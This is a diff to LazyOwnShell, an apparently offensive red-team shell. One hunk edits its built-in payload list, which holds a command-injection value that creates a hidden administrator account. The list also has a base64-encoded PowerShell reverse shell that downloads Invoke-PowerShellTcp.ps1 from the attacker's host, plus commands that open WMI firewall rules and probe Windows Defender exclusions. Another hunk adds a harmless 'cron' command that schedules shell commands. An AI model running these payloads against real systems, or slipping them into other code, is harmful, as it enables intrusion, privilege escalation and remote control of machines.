@@ -5387,7 +5387,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
             ("WIN ReverShell winbase64encode", f'echo -n "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
             ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
-            ("WIN enum Reg", "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"),
+            ("WIN enum locker", "get-applockerPolicy -effective -xml"),
             ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
             ("WIN enum WMI access",'netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes'),
             ("WIN Identify Exclusions",'& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\\folder_to_check\|*"'),
@@ -16500,6 +16500,51 @@ class LazyOwnShell(cmd2.Cmd):
         for p in ports.split(","):
             
             print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={p}")
+        return
+
+    def do_cron(self, line):
+        """
+        Schedules a command to run at a specified time.
+
+        This function allows users to schedule a command to execute at a specific hour and minute.
+        If the specified time has already passed for the current day, the command will be scheduled 
+        to run the following day.
+
+        Usage:
+            cron HH:MM command [args]
+
+        Parameters:
+        line (str): The input string containing the scheduled time in 'HH:MM' format followed by the command and arguments.
+
+        Returns:
+        None
+        """
+        if not line:
+            print_error("Enter the hour and the command")
+            return
+
+        parts = line.split(maxsplit=1)
+        if len(parts) != 2:
+            print_error("Format: cron HH:MM command [args]")
+            return
+
+        time_str, command = parts
+        try:
+            schedule_time = datetime.strptime(time_str, '%H:%M').time()
+            now = datetime.now().time()
+
+            delta = datetime.combine(date.today(), schedule_time) - datetime.combine(date.today(), now)
+            if delta.total_seconds() < 0:
+                delta += timedelta(days=1)
+
+            def lazyrun_command():
+                self.onecmd(command)
+
+            Timer(delta.total_seconds(), lazyrun_command).start()
+            print_msg(f"Command scheduled for: {time_str}")
+
+        except ValueError:
+            print_error("Invalid format. Use cron HH:MM command [optional args]")
         return
 
 if __name__ == "__main__":
